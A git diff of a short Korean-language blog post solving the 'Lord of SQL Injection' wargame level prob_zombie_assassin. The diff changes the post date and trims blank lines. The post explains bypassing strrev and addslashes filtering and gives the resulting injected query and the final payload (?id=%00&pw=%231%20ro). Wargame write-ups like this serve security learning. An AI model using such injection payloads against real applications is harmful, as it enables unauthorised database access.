@@ -1,7 +1,7 @@
 ---
 layout: post
 title:  "los prob_zombie_assassin"
-date:   2019-10-22
+date:   2019-10-28
 excerpt: "Lord of Sql Injection"
 tag:
 - los
@@ -31,13 +31,9 @@ comments: true
 
 # Solve
 1. strrev, addslashes 함수
-
 2. '(싱글쿼터) 이외에 addslashed가 적용되는 문자 -> %00, "
-
 3. \' 문자취급
-
 4. 최종 쿼리문 -> select id from prob_zombie_assassin where id='0\' and pw='or 1#'
-
 5. strrev 생각하며 값을 집어넣음
 
 ### ?id=%00&pw=%231%20ro
